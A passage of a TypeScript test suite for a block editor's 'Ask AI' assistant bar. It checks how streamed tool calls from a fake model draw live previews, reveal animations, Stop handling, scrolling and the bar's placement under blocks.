    field.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true, cancelable: true }));
    await waitFor(() => expect(within(bar()).queryByRole('button', { name: 'Stop' })).toBeNull());
    expect(bar()).toBeVisible();

    field.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true, cancelable: true }));
    await settle();
    expect(screen.queryByRole('dialog', { name: 'Ask AI' })).toBeNull();
    expect(editor.agent.state.status).toBe('idle');
  });

  it('does not open in read-only mode', async () => {
    const editor = await createEditor(scripted());

    await editor.readOnly.toggle(true);
    editor.agent.openAssistant();

    expect(screen.queryByRole('dialog', { name: 'Ask AI' })).toBeNull();
  });

  it('ignores an empty prompt', async () => {
    const model = scripted();
    const editor = await createEditor(model);

    editor.agent.openAssistant();
    submit('   ');
    await settle();

    expect(model.requests).toHaveLength(0);
    expect(editor.agent.state.status).toBe('idle');
  });

  describe('live edits', () => {
    const insert = (text: string): unknown[] => [{ name: 'block.insert', args: { type: 'paragraph', position: 'end', data: { text } } }];

    it('stream events drive the preview: update on tool_input, settle on success', async () => {
      const live = streaming();
      const editor = await createEditor(live.model);

      fakeLayout();
      const call = executeCall('c1', insert('Fresh words here'));

      editor.agent.openAssistant();
      submit('Write');
      await waitFor(() => expect(live.started()).toBe(true));

      live.emit({ type: 'tool_start', index: 0, id: 'c1', name: 'blok_execute' });
      live.emit({ type: 'tool_input', index: 0, json: call.json.slice(0, call.json.indexOf('here')) });
      await waitFor(() => expect(previewText()).toBe('Fresh words'));
      expect(await texts(editor)).toEqual(['Hello']);

      live.emit({ type: 'tool_input', index: 0, json: call.json });
      live.emit({ type: 'tool_end', index: 0 });

      // The call commits at its tool_end, before the model's answer, and the preview hands off.
      await waitFor(async () => expect(await texts(editor)).toEqual(['Hello', 'Fresh words here']));
      await waitFor(() => expect(document.querySelector(PREVIEW)).toBeNull());
      // Only the bar's own space is left, over what it wrote: the preview's share of the gap is gone.
      const written = document.querySelector('[data-blok-id]:not([data-blok-id="p1"])');

      expect(gapped()).toEqual([written?.getAttribute('data-blok-id')]);
      expect(startGap(written)).toBe(`${BAR_GAP}px`);
      expect(revealed()).toEqual([]);

      live.finish(call.use);
      await waitFor(() => expect(within(bar()).getByText('Done.')).toBeVisible());
    });

    it('a call aimed at a sub-page draws no preview here, even when page comes after commands', async () => {
      const live = streaming();
      const pages: Record<string, OutputData> = { sub: { blocks: [] } };
      const editor = await createEditor(live.model, undefined, {
        tools: {
          paragraph: Paragraph,
          page: { class: PageTool, config: {
            loadDocument: (pageId: string) => structuredClone(pages[pageId] ?? null),
            saveDocument: (pageId: string, data: OutputData) => {
              pages[pageId] = structuredClone(data);
            },
          } },
        },
        data: { blocks: [{ id: 'p1', type: 'paragraph', data: { text: 'Hello' } }, { id: 'pg', type: 'page', data: { pageId: 'sub' } }] },
      });
      const commands = insert('Sub page words');
      const json = JSON.stringify({ commands, page: 'pg' });

      fakeLayout();
      editor.agent.openAssistant();
      submit('Write');
      await waitFor(() => expect(live.started()).toBe(true));

      live.emit({ type: 'tool_start', index: 0, id: 'c1', name: 'blok_execute' });
      live.emit({ type: 'tool_input', index: 0, json: json.slice(0, json.indexOf('words')) });
      // Before page arrives the call looks like one on this page.
      await waitFor(() => expect(previewText()).toBe('Sub page'));
      live.emit({ type: 'tool_input', index: 0, json });
      await waitFor(() => expect(document.querySelector(PREVIEW)).toBeNull());
      live.emit({ type: 'tool_end', index: 0 });
      live.finish({ stop_reason: 'tool_use', content: [{ type: 'tool_use', id: 'c1', name: 'blok_execute', input: { commands, page: 'pg' } }] });

      await waitFor(() => expect(within(bar()).getByText('Done.')).toBeVisible());
      expect(document.querySelector(PREVIEW)).toBeNull();
      expect((await editor.save()).blocks.map((block) => block.id)).toEqual(['p1', 'pg']);
      expect(pages.sub.blocks.map((block) => plain(block.data.text))).toEqual(['Sub page words']);
    });

    it('a call id the model used in an earlier run streams live words again', async () => {
      const runs = liveRuns();
      const editor = await createEditor(runs.model);

      fakeLayout();
      editor.agent.openAssistant();

      const streamRun = async (call: number, text: string): Promise<void> => {
        const { json, use } = executeCall('call-1-0', insert(text));
        const emit = (event: AgentModelStreamEvent): void => runs.calls[call].request.onStream?.(event);

        await waitFor(() => expect(runs.calls).toHaveLength(call + 1));
        emit({ type: 'tool_start', index: 0, id: 'call-1-0', name: 'blok_execute' });
        emit({ type: 'tool_input', index: 0, json: json.slice(0, json.indexOf('here')) });
        await waitFor(() => expect(previewText()).toBe(text.replace(' here', '')));
        emit({ type: 'tool_input', index: 0, json });
        emit({ type: 'tool_end', index: 0 });
        runs.calls[call].finish(use);
        await waitFor(() => expect(runs.calls).toHaveLength(call + 2));
        runs.calls[call + 1].finish(answer('Done.'));
        await waitFor(() => expect(within(bar()).getByText('Done.')).toBeVisible());
      };

      submit('One');
      await streamRun(0, 'First words here');
      submit('Two');
      await streamRun(2, 'Second words here');

      expect(await texts(editor)).toEqual(['Hello', 'First words here', 'Second words here']);
    });

    it('a streamed call that painted an insert still plays the reveal on a rewrite it did not draw', async () => {
      const live = streaming();
      const editor = await createEditor(live.model);

      fakeLayout();
      // An embed cannot show as overlay text, so this rewrite is never framed.
      const call = executeCall('c1', [
        ...insert('Fresh words here'),
        { name: 'block.update', args: { id: 'p1', data: { text: [{ text: 'Area ' }, { embed: { equation: { expression: 'x^2' } } }] } } },
      ]);

      editor.agent.openAssistant();
      submit('Write');
      await waitFor(() => expect(live.started()).toBe(true));

      live.emit({ type: 'tool_start', index: 0, id: 'c1', name: 'blok_execute' });
      live.emit({ type: 'tool_input', index: 0, json: call.json.slice(0, call.json.indexOf('here')) });
      await waitFor(() => expect(previewText()).toBe('Fresh words'));
      // A frame paints the words, so the call counts as seen.
      await settle(50);
      live.emit({ type: 'tool_input', index: 0, json: call.json });
      live.emit({ type: 'tool_end', index: 0 });

      await waitFor(() => expect(revealed()).toEqual([holderOf('p1').textContent ?? '']));
      expect(revealed()).not.toContain('Fresh words here');
      live.finish(call.use);
      await waitFor(() => expect(within(bar()).getByText('Done.')).toBeVisible());
    });

    it('lays out two streaming calls in one frame and re-places the bar once for both gaps', async () => {
      const live = streaming();
      const editor = await createEditor(live.model, undefined, THREE_BLOCKS);

      fakeLayout();
      editor.agent.openAssistant();
      submit('Write');
      await waitFor(() => expect(live.started()).toBe(true));
      live.emit({ type: 'tool_start', index: 0, id: 'c1', name: 'blok_execute' });
      live.emit({ type: 'tool_start', index: 1, id: 'c2', name: 'blok_execute' });
      await settle(50);

      const frames: FrameRequestCallback[] = [];
      const barReads = { count: 0 };
      const measure = vi.mocked(HTMLElement.prototype.getBoundingClientRect).getMockImplementation();

      vi.stubGlobal('requestAnimationFrame', (frame: FrameRequestCallback): number => frames.push(frame));
      vi.mocked(HTMLElement.prototype.getBoundingClientRect).mockImplementation(function (this: HTMLElement): DOMRect {
        if (this.getAttribute('data-blok-testid') === 'assistant-bar') {
          barReads.count += 1;
        }

        return measure === undefined ? new DOMRect() : measure.call(this);
      });

      const first = executeCall('c1', [{ name: 'block.insert', args: { type: 'paragraph', position: { after: 'p1' }, data: { text: 'Alpha beta here' } } }]);
      const second = executeCall('c2', [{ name: 'block.insert', args: { type: 'paragraph', position: { after: 'p2' }, data: { text: 'Gamma delta here' } } }]);

      live.emit({ type: 'tool_input', index: 0, json: first.json.slice(0, first.json.indexOf('beta')) });
      live.emit({ type: 'tool_input', index: 1, json: second.json.slice(0, second.json.indexOf('delta')) });
      live.emit({ type: 'tool_input', index: 0, json: first.json.slice(0, first.json.indexOf('here')) });

      // Nothing is laid out, and the bar (under p3) is not re-placed, until the frame.
      expect(gapped()).toEqual(['p3']);
      expect(barReads.count).toBe(0);

      frames.splice(0).forEach((frame) => frame(0));

      expect(gapped()).toEqual(['p1', 'p2', 'p3']);
      expect(barReads.count).toBe(1);
      vi.unstubAllGlobals();
      live.finish(answer('Done.'));
      await waitFor(() => expect(within(bar()).getByText('Done.')).toBeVisible());
    });

    it('an error result cancels its preview', async () => {
      const live = streaming();
      const editor = await createEditor(live.model);

      fakeLayout();
      const call = executeCall('c1', [{ name: 'block.insert', args: { type: 'no-such-tool', position: 'end', data: { text: 'Never lands here' } } }]);

      editor.agent.openAssistant();
      submit('Write');
      await waitFor(() => expect(live.started()).toBe(true));

      live.emit({ type: 'tool_start', index: 0, id: 'c1', name: 'blok_execute' });
      live.emit({ type: 'tool_input', index: 0, json: call.json });
      await waitFor(() => expect(document.querySelector(PREVIEW)).not.toBeNull());
      // Drawn: the bar's slots hand over to the box.
      await waitFor(() => expect(bar().querySelector('[data-blok-assistant-slots]:not([hidden])')).toBeNull());

      // Settle waits a frame to hand off; with no frames, only cancel can remove the box.
      vi.stubGlobal('requestAnimationFrame', () => 0);
      live.emit({ type: 'tool_end', index: 0 });

      // Gone while the model still holds its answer: the failed call removed it.
      await waitFor(() => expect(document.querySelector(PREVIEW)).toBeNull());
      // Only the bar's own space is left: the preview's share of the gap is gone.
      expect(gapped()).toEqual(['p1']);
      expect(gapOf('p1')).toBe(`${BAR_GAP}px`);
      expect(await texts(editor)).toEqual(['Hello']);
      live.finish(call.use);
    });

    it('stop clears the preview and leaves only the bar\'s gap', async () => {
      const live = streaming();
      const editor = await createEditor(live.model);

      fakeLayout();
      const call = executeCall('c1', insert('Half written words'));

      editor.agent.openAssistant();
      submit('Write');
      await waitFor(() => expect(live.started()).toBe(true));

      live.emit({ type: 'tool_start', index: 0, id: 'c1', name: 'blok_execute' });
      live.emit({ type: 'tool_input', index: 0, json: call.json.slice(0, call.json.indexOf('words')) });
      await waitFor(() => expect(previewText()).toBe('Half written'));

      within(bar()).getByRole('button', { name: 'Stop' }).click();

      expect(document.querySelector(PREVIEW)).toBeNull();
      // Only the bar's own space is left: the preview's share of the gap is gone.
      expect(gapped()).toEqual(['p1']);
      expect(gapOf('p1')).toBe(`${BAR_GAP}px`);

      // A late event of the stopped answer draws nothing.
      live.emit({ type: 'tool_start', index: 1, id: 'c2', name: 'blok_execute' });
      live.emit({ type: 'tool_input', index: 1, json: executeCall('c2', insert('Too late now')).json });
      await settle(50);

      expect(document.querySelector(PREVIEW)).toBeNull();
      // Only the bar's own space is left: the preview's share of the gap is gone.
      expect(gapped()).toEqual(['p1']);
      expect(gapOf('p1')).toBe(`${BAR_GAP}px`);
      await waitFor(() => expect(within(bar()).queryByRole('button', { name: 'Stop' })).toBeNull());
      expect(await texts(editor)).toEqual(['Hello']);
    });

    it('a call that never streamed plays the reveal on the changed blocks', async () => {
      const onChange = vi.fn();
      const editor = await createEditor(scripted(insertBatch('From AI'), answer('Done.')), undefined, { onChange });

      editor.agent.openAssistant();
      submit('Write');

      await waitFor(() => expect(revealed()).toEqual(['From AI']));
      await waitFor(() => expect(within(bar()).getByText('Done.')).toBeVisible());
      await settle(50);
      const changes = onChange.mock.calls.length;

      // The class goes once the reveal has played, and the reveal itself is no edit.
      await waitFor(() => expect(revealed()).toEqual([]), { timeout: 2000 });
      await settle(50);
      expect(onChange).toHaveBeenCalledTimes(changes);
      expect(await texts(editor)).toEqual(['Hello', 'From AI']);
    });

    it('a call whose events all arrive in one tick plays the reveal, like a call that never streamed', async () => {
      const live = streaming();
      const editor = await createEditor(live.model);

      fakeLayout();
      const call = executeCall('c1', insert('All at once'));

      editor.agent.openAssistant();
      submit('Write');
      await waitFor(() => expect(live.started()).toBe(true));

      // Gemini sends a whole call at the end of its stream.
      live.emit({ type: 'tool_start', index: 0, id: 'c1', name: 'blok_execute' });
      live.emit({ type: 'tool_input', index: 0, json: call.json });
      live.emit({ type: 'tool_end', index: 0 });

      await waitFor(() => expect(revealed()).toEqual(['All at once']));
      expect(document.querySelector(PREVIEW)).toBeNull();
      live.finish(call.use);
      await waitFor(() => expect(within(bar()).getByText('Done.')).toBeVisible());
    });

    it('Stop between a one-tick call\'s tool_end and its result clears the preview and plays no reveal', async () => {
      const live = streaming();
      const editor = await createEditor(live.model);

      fakeLayout();
      const call = executeCall('c1', insert('Stopped call'));

      editor.agent.openAssistant();
      submit('Write');
      await waitFor(() => expect(live.started()).toBe(true));

      live.emit({ type: 'tool_start', index: 0, id: 'c1', name: 'blok_execute' });
      live.emit({ type: 'tool_input', index: 0, json: call.json });
      live.emit({ type: 'tool_end', index: 0 });
      // The call is unseen and its result has not come back yet.
      fireEvent.click(within(bar()).getByRole('button', { name: 'Stop' }));

      expect(previewText()).toBe('');
      await waitFor(() => expect(within(bar()).getByRole('alert')).toHaveTextContent('Stopped.'));
      await settle(50);
      expect(revealed()).toEqual([]);
      expect(gapped()).toEqual(['p1']);
      // The loop starts a call a microtask after its tool_end, so this Stop came first.
      expect(await texts(editor)).toEqual(['Hello']);
    });

    it('names a streamed call from its first words; execute neither repeats the line nor restarts its hold', async () => {
      const calls: Array<{ request: AgentModelRequest; finish(response: AgentModelResponse): void }> = [];
      const model: AgentModel = (request) => new Promise((resolve, reject) => {
        request.signal.addEventListener('abort', () => reject(new DOMException('aborted', 'AbortError')));
        calls.push({ request, finish: resolve });
      });
      const editor = await createEditor(model);
      const statuses: string[] = [];
      const observer = new MutationObserver(() => {
        const open = screen.queryByRole('dialog', { name: 'Ask AI' });
        const text = open === null ? '' : within(open).getByRole('status').textContent ?? '';

        if (text !== '' && statuses.at(-1) !== text) {
          statuses.push(text);
        }
      });

      fakeLayout();
      const call = executeCall('c1', insert('A big paragraph'));
      const emit = (event: AgentModelStreamEvent): void => calls[0].request.onStream?.(event);

      editor.agent.openAssistant();
      observer.observe(bar(), { subtree: true, childList: true, characterData: true });
      submit('Write');
      await waitFor(() => expect(calls).toHaveLength(1));

      emit({ type: 'tool_start', index: 0, id: 'c1', name: 'blok_execute' });
      emit({ type: 'tool_input', index: 0, json: call.json.slice(0, call.json.indexOf('A big ') + 'A big '.length) });
      await waitFor(() => expect(within(bar()).getByRole('status')).toHaveTextContent('Writing a paragraph…'));

      await settle(300);
      emit({ type: 'tool_input', index: 0, json: call.json });
      emit({ type: 'tool_end', index: 0 });
      await waitFor(async () => expect(await texts(editor)).toEqual(['Hello', 'A big paragraph']));
      calls[0].finish(call.use);
      await waitFor(() => expect(calls).toHaveLength(2));

      // The hold began with the first words, so Thinking is back 0.6s after them, not 0.6s after execute.
      await settle(400);
      observer.disconnect();
      expect(within(bar()).getByRole('status')).toHaveTextContent('Thinking…');
      expect(statuses).toEqual(['Thinking…', 'Writing a paragraph…', 'Thinking…']);
      calls[1].finish(answer('Done.'));
      await waitFor(() => expect(within(bar()).getByText('Done.')).toBeVisible());
    });

    it('plays no reveal under reduced motion', async () => {
      vi.stubGlobal('matchMedia', (query: string) => ({
        matches: query.includes('reduce'),
        media: query,
        onchange: null,
        addListener: vi.fn(),
        removeListener: vi.fn(),
        addEventListener: vi.fn(),
        removeEventListener: vi.fn(),
        dispatchEvent: () => false,
      }));
      const editor = await createEditor(scripted(insertBatch('From AI'), answer('Done.')));
      const added = vi.fn();
      const observer = new MutationObserver((records) => {
        if (records.some((record) => record.target instanceof Element && record.target.classList.contains('blok-ai-reveal'))) {
          added();
        }
      });

      observer.observe(document.body, { subtree: true, attributes: true, attributeFilter: ['class'] });
      editor.agent.openAssistant();
      submit('Write');
      await waitFor(() => expect(within(bar()).getByText('Done.')).toBeVisible());
      observer.disconnect();

      expect(await texts(editor)).toEqual(['Hello', 'From AI']);
      expect(added).not.toHaveBeenCalled();
    });

    it('re-places the preview when the page scrolls', async () => {
      const live = streaming();
      const editor = await createEditor(live.model);
      const call = executeCall('c1', insert('Moving words here'));
      const holder = document.querySelector('[data-blok-id="p1"]');
      const page = { y: 0 };
      const measure = HTMLElement.prototype.getBoundingClientRect;

      vi.spyOn(HTMLElement.prototype, 'getBoundingClientRect').mockImplementation(function (this: HTMLElement): DOMRect {
        return this === holder ? new DOMRect(0, page.y, 600, 24) : measure.call(this);
      });
      editor.agent.openAssistant();
      submit('Write');
      await waitFor(() => expect(live.started()).toBe(true));
      live.emit({ type: 'tool_start', index: 0, id: 'c1', name: 'blok_execute' });
      live.emit({ type: 'tool_input', index: 0, json: call.json.slice(0, call.json.indexOf('here')) });
      await waitFor(() => expect(previewText()).toBe('Moving words'));

      const top = (): number => parseFloat(document.querySelector<HTMLElement>(PREVIEW)?.style.top ?? '');
      const before = top();

      page.y = -100;
      // Scroll does not bubble: the module listens in the capture phase.
      document.dispatchEvent(new Event('scroll'));

      await waitFor(() => expect(top()).toBe(before - 100));
      live.finish(call.use);
      await waitFor(() => expect(within(bar()).getByText('Done.')).toBeVisible());
    });

    /** Puts every block holder below the viewport, or inside it. */
    const holdersAt = (top: number): void => {
      const measure = HTMLElement.prototype.getBoundingClientRect;

      vi.spyOn(HTMLElement.prototype, 'getBoundingClientRect').mockImplementation(function (this: HTMLElement): DOMRect {
        return this.hasAttribute('data-blok-element') ? new DOMRect(0, top, 600, 24) : measure.call(this);
      });
    };

    it('does not scroll the page to an edit below the window', async () => {
      const editor = await createEditor(scripted(insertBatch('One'), answer('Done one.'), insertBatch('Two'), answer('Done two.')));

      holdersAt(2000);
      editor.agent.openAssistant();
      submit('Write one');
      await waitFor(() => expect(within(bar()).getByText('Done one.')).toBeVisible());
      submit('Write two');
      await waitFor(() => expect(within(bar()).getByText('Done two.')).toBeVisible());

      expect(scrolls.spy).not.toHaveBeenCalled();
      expect(await texts(editor)).toEqual(['Hello', 'One', 'Two']);
    });

    /** Holders and streamed words both at `top`: below jsdom's 768px window when it is large. */
    const wordsAt = (top: number): void => {
      const measure = HTMLElement.prototype.getBoundingClientRect;

      vi.spyOn(HTMLElement.prototype, 'getBoundingClientRect').mockImplementation(function (this: HTMLElement): DOMRect {
        if (this.classList.contains('blok-ai-word') || this.hasAttribute('data-blok-element')) {
          return new DOMRect(0, top, 60, 24);
        }

        return measure.call(this);
      });
    };

    /** Streams a paragraph insert's first words into a held call. */
    const streamWords = async (live: ReturnType<typeof streaming>): Promise<void> => {
      const call = executeCall('c1', insert('Far away words land here'));

      await waitFor(() => expect(live.started()).toBe(true));
      live.emit({ type: 'tool_start', index: 0, id: 'c1', name: 'blok_execute' });
      live.emit({ type: 'tool_input', index: 0, json: call.json.slice(0, call.json.indexOf('here')) });
      await waitFor(() => expect(previewText()).toBe('Far away words land'));
    };

    it('does not scroll the page to a streamed word drawn below the window', async () => {
      const live = streaming();
      const editor = await createEditor(live.model);

      wordsAt(2000);
      editor.agent.openAssistant();
      submit('Write');
      await streamWords(live);
      await settle(50);

      expect(scrolls.spy).not.toHaveBeenCalled();
      expect(await texts(editor)).toEqual(['Hello']);
    });

    it('does not scroll to an edit already in view', async () => {
      const editor = await createEditor(scripted(insertBatch('One'), answer('Done.')));

      holdersAt(100);
      editor.agent.openAssistant();
      submit('Write');
      await waitFor(() => expect(within(bar()).getByText('Done.')).toBeVisible());

      expect(await texts(editor)).toEqual(['Hello', 'One']);
      expect(scrolls.spy).not.toHaveBeenCalled();
    });

    it('Ask AI runs draw no local caret or arrival pulse', async () => {
      const editor = await createEditor(scripted(insertBatch('From AI'), answer('Done.')));

      editor.agent.openAssistant();
      submit('Write');
      await waitFor(() => expect(within(bar()).getByText('Done.')).toBeVisible());

      expect(await texts(editor)).toEqual(['Hello', 'From AI']);
      expect(document.querySelector('[data-blok-presence-caret], [data-blok-agent-marker]')).toBeNull();
      expect(document.querySelector('.blok-block--target')).toBeNull();
    });
  });

  describe('a click outside', () => {
    const type = (text: string): void => {
      const field = within(bar()).getByRole('textbox');

      if (!(field instanceof HTMLTextAreaElement)) {
        throw new Error('prompt field is not a textarea');
      }
      field.value = text;
      field.dispatchEvent(new Event('input', { bubbles: true }));
    };
    const pressOn = (target: Element): void => {
      target.dispatchEvent(new PointerEvent('pointerdown', { bubbles: true, cancelable: true }));
    };
    const barShown = (): boolean => screen.queryByRole('dialog', { name: 'Ask AI' }) !== null;
    const fieldValue = (): string => within(bar()).getByRole<HTMLTextAreaElement>('textbox').value;

    it('closes the bar before a run, and the next open brings back what was typed', async () => {
      await createEditor(scripted());
      pressModJ(paragraphInput());
      type('Draft prompt');

      pressOn(paragraphInput());

      expect(barShown()).toBe(false);
      pressModJ(paragraphInput());
      expect(fieldValue()).toBe('Draft prompt');
      expect(within(bar()).getByRole('button', { name: 'Send' })).toBeEnabled();
    });

    it('keeps the bar open for a press inside it', async () => {
      await createEditor(scripted());
      pressModJ(paragraphInput());

      pressOn(within(bar()).getByRole('textbox'));

      expect(barShown()).toBe(true);
    });

    it('leaves the bar open once a run has started', async () => {
      await createEditor(scripted(answer('Done.')));
      pressModJ(paragraphInput());
      submit('Write');
      await waitFor(() => expect(within(bar()).getByText('Done.')).toBeVisible());

      pressOn(paragraphInput());

      expect(barShown()).toBe(true);
    });

    it('does not bring back a prompt that was sent', async () => {
      await createEditor(scripted(answer('Done.')));
      pressModJ(paragraphInput());
      submit('Write');
      await waitFor(() => expect(within(bar()).getByText('Done.')).toBeVisible());
      within(bar()).getByRole('textbox').dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true, cancelable: true }));

      pressModJ(paragraphInput());

      expect(fieldValue()).toBe('');
    });
  });

  describe('in the page', () => {
    it('opens anchored under the caret block and reserves a gap there', async () => {
      await createEditor(scripted(), undefined, THREE_BLOCKS);
      fakeLayout();
      select('p2', 2, 'p2', 2);

      pressModJ(inputOf('p2'));

      expect(gapped()).toEqual(['p2']);
      expect(gapOf('p2')).toBe(`${BAR_GAP}px`);
      // 6px under p2 (top 200, 24 tall), across the content column (140, 520 wide) plus 12px a side.
      expect(barStyle()).toEqual({ top: '230px', left: '128px', width: '544px' });
    });

    describe('opened by Space in an empty paragraph', () => {
      const WITH_EMPTY: Partial<BlokConfig> = {
        data: {
          blocks: [
            { id: 'p1', type: 'paragraph', data: { text: 'Hello' } },
            { id: 'p2', type: 'paragraph', data: { text: '' } },
            { id: 'p3', type: 'paragraph', data: { text: 'Third' } },
          ],
        },
      };

      const pressSpace = (target: HTMLElement): void => {
        target.dispatchEvent(new KeyboardEvent('keydown', { key: ' ', code: 'Space', bubbles: true, cancelable: true }));
      };

      it('sits in place of the empty block, which it hides', async () => {
        await createEditor(scripted(), undefined, WITH_EMPTY);
        fakeLayout();
        select('p2', 0, 'p2', 0);

        pressSpace(inputOf('p2'));

        // Centred on p2 (200..224) and floating: the page below does not move.
        expect(barStyle().top).toBe('189px');
        expect(gapOf('p2')).toBe('0px');
        expect(holderOf('p2')).toHaveAttribute('data-blok-ai-replaced');
      });

      it('holds space only for what the bar grows by after it opened', async () => {
        const live = streaming();

        await createEditor(live.model, undefined, WITH_EMPTY);
        fakeLayout();
        select('p2', 0, 'p2', 0);
        pressSpace(inputOf('p2'));

        submit('Write');
        await waitFor(() => expect(live.started()).toBe(true));
        live.emit({ type: 'tool_start', index: 0, id: 'c1', name: 'blok_execute' });

        // The bar ends 11px past p2, and its slots hang 10px under it.
        await waitFor(() => expect(holderOf('p2').style.getPropertyValue('--blok-ai-gap')).toBe(`${11 + 10 + SLOTS_HEIGHT}px`));
        expect(barStyle().top).toBe('189px');
      });

      it('shows the block again when the bar closes', async () => {
        await createEditor(scripted(), undefined, WITH_EMPTY);
        fakeLayout();
        select('p2', 0, 'p2', 0);
        pressSpace(inputOf('p2'));

        within(bar()).getByRole('textbox').dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true, cancelable: true }));

        expect(holderOf('p2')).not.toHaveAttribute('data-blok-ai-replaced');
        expect(gapped()).toEqual([]);
      });

      it('goes under the block once the block has text', async () => {
        const editor = await createEditor(scripted(), undefined, WITH_EMPTY);

        fakeLayout();
        select('p2', 0, 'p2', 0);
        pressSpace(inputOf('p2'));

        await editor.blocks.update('p2', { text: 'Now full' });

        await waitFor(() => expect(barStyle().top).toBe('230px'));
        expect(gapOf('p2')).toBe(`${BAR_GAP}px`);
        expect(document.querySelector('[data-blok-ai-replaced]')).toBeNull();
      });

      it('hides the block controls while open, and lets them back after', async () => {
        const editor = await createEditor(scripted(), undefined, WITH_EMPTY);
        const toolbarOpen = (): boolean => document.querySelector('[data-blok-opened="true"]') !== null;

        select('p2', 0, 'p2', 0);
        // The toolbox builds in an idle callback; the toolbar opens once it exists.
        await waitFor(() => {
          editor.toolbar.open();
          expect(toolbarOpen()).toBe(true);
        });

        pressSpace(inputOf('p2'));

        expect(toolbarOpen()).toBe(false);
        // A hover over a block while the bar is open does not bring them back.
        editor.toolbar.open();
        expect(toolbarOpen()).toBe(false);

        within(bar()).getByRole('textbox').dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true, cancelable: true }));
        editor.toolbar.open();

        expect(toolbarOpen()).toBe(true);
      });

      it('Mod+J in an empty paragraph still opens under it', async () => {
        await createEditor(scripted(), undefined, WITH_EMPTY);
        fakeLayout();
        select('p2', 0, 'p2', 0);

        pressModJ(inputOf('p2'));

        expect(barStyle().top).toBe('230px');
        expect(holderOf('p2')).not.toHaveAttribute('data-blok-ai-replaced');
      });
    });

    it('opens under the selection\'s block from the inline toolbar', async () => {
      const editor = await createEditor(scripted(), undefined, THREE_BLOCKS);

      fakeLayout();
      select('p1', 1, 'p2', 3);
      editor.agent.openAssistant();

      expect(gapped()).toEqual(['p2']);
      expect(barStyle().top).toBe('230px');
    });

    it('a selection that ends at the very start of a block anchors to the block before', async () => {
      const editor = await createEditor(scripted(), undefined, THREE_BLOCKS);

      fakeLayout();
      // A triple-click on p1 ends the range at offset 0 of p2.
      select('p1', 0, 'p2', 0);
      editor.agent.openAssistant();

      expect(gapped()).toEqual(['p1']);
      expect(barStyle().top).toBe('130px');
    });

    it('re-anchors when its block is removed: to the next block, else the one before', async () => {
      const editor = await createEditor(scripted(), undefined, THREE_BLOCKS);

      fakeLayout();
      select('p2', 0, 'p2', 0);
      pressModJ(inputOf('p2'));
      expect(gapped()).toEqual(['p2']);

      await editor.blocks.delete(1);

      await waitFor(() => expect(gapped()).toEqual(['p3']));
      expect(gapOf('p3')).toBe(`${BAR_GAP}px`);
      // p3 is now the second holder: top 200.
      expect(barStyle().top).toBe('230px');

      await editor.blocks.delete(1);

      await waitFor(() => expect(gapped()).toEqual(['p1']));
      expect(barStyle().top).toBe('130px');
    });

    it('answered state shows the first reply line with Undo and Keep', async () => {
      await createEditor(scripted(insertBatch('From AI'), answer('Added a paragraph.')));

      pressModJ(paragraphInput());
      submit('Add a line');
      await waitFor(() => expect(within(bar()).getByText('Added a paragraph.')).toBeVisible());

      const undo = within(bar()).getByRole('button', { name: 'Discard' });
      const keep = within(bar()).getByRole('button', { name: 'Keep' });

      // Labelled pills: the visible label is the name.
      ([[undo, 'Discard'], [keep, 'Keep']] as const).forEach(([button, label]) => {
        expect(button).toBeVisible();
        expect(button.textContent?.trim()).toBe(label);
        expect(button.querySelector('svg')).not.toBeNull();
      });
      // The field still takes a follow-up.
      expect(within(bar()).getByRole('textbox')).toHaveFocus();
    });

    it('shows a long reply in full under its first line, with no Show more toggle', async () => {
      await createEditor(scripted(answer('Added two lines.\n\nThe first one says hello.\n\n- one\n- two')));

      pressModJ(paragraphInput());
      submit('Write');
      await waitFor(() => expect(within(bar()).getAllByRole('listitem')).toHaveLength(2));

      expect(within(bar()).queryByRole('button', { name: 'Show more' })).toBeNull();
      expect(within(bar()).getByText('The first one says hello.')).toBeVisible();
      expect(within(bar()).getAllByRole('listitem').map((item) => item.textContent)).toEqual(['one', 'two']);
      // The summary is not repeated in the panel.
      expect(within(bar()).getAllByText('Added two lines.')).toHaveLength(1);
    });

    it('moves down when a block above its anchor grows', async () => {
      await createEditor(scripted(), undefined, THREE_BLOCKS);

      const measure = HTMLElement.prototype.getBoundingClientRect;
      const holders = (): HTMLElement[] => [...document.querySelectorAll<HTMLElement>('[data-blok-element]')];
      const gapPx = (holder: HTMLElement): number => parseFloat(holder.style.getPropertyValue('--blok-ai-gap') || '0');

      // Like fakeLayout, but a holder sits lower by every gap held above it.
      vi.spyOn(HTMLElement.prototype, 'getBoundingClientRect').mockImplementation(function (this: HTMLElement): DOMRect {
        if (this.getAttribute('data-blok-testid') === 'assistant-bar') {
          return new DOMRect(0, 0, 600, BAR_HEIGHT);
        }

        const holder = this.closest('[data-blok-element]');

        if (!(holder instanceof HTMLElement)) {
          return measure.call(this);
        }

        const before = holders().slice(0, holders().indexOf(holder));
        const top = 100 + 100 * before.length + before.reduce((total, above) => total + gapPx(above), 0);

        return this === holder ? new DOMRect(100, top, 600, 24) : new DOMRect(140, top, 520, 24);
      });
      select('p2', 0, 'p2', 0);
      pressModJ(inputOf('p2'));
      expect(barStyle().top).toBe('230px');

      // A preview box opening under p1 pushes p2, and the bar with it.
      reserveGap(holderOf('p1'), 'insert:test', 40);

      expect(barStyle().top).toBe('270px');
      releaseGap(holderOf('p1'), 'insert:test');
      expect(barStyle().top).toBe('230px');
    });

    it('scrolls a bar that opens below the window into view, once', async () => {
      await createEditor(scripted(), undefined, THREE_BLOCKS);
      fakeLayout();
      vi.spyOn(window, 'innerHeight', 'get').mockReturnValue(250);
      const scrollBy = vi.spyOn(window, 'scrollBy').mockImplementation(() => undefined);

      select('p2', 0, 'p2', 0);
      pressModJ(inputOf('p2'));

      // The bar runs from 230 to 276: up by its overflow plus 16px of room.
      expect(scrollBy).toHaveBeenCalledTimes(1);
      expect(scrollBy).toHaveBeenCalledWith({ top: 276 - 250 + 16, behavior: 'smooth' });

      // Later scrolls are the user's: the bar does not pull the page back.
      document.dispatchEvent(new Event('scroll'));
      await settle(50);
      expect(scrollBy).toHaveBeenCalledTimes(1);
    });

    it('does not scroll when the bar opens inside the window', async () => {
      await createEditor(scripted(), undefined, THREE_BLOCKS);
      fakeLayout();
      const scrollBy = vi.spyOn(window, 'scrollBy').mockImplementation(() => undefined);

      select('p2', 0, 'p2', 0);
      pressModJ(inputOf('p2'));

